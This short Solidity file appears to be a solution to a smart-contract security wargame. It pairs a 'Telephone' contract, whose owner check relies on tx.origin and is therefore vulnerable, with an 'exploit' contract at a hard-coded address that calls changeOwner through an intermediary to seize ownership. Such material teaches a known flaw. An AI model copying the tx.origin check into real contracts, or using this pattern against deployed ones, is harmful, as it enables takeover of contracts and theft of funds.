// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract exploit {
    Telephone a = Telephone(0xFF07903c69D29DFdc80C1CcFAdCDF30351764e56);

    function attack() public {
        a.changeOwner(msg.sender);
    }
}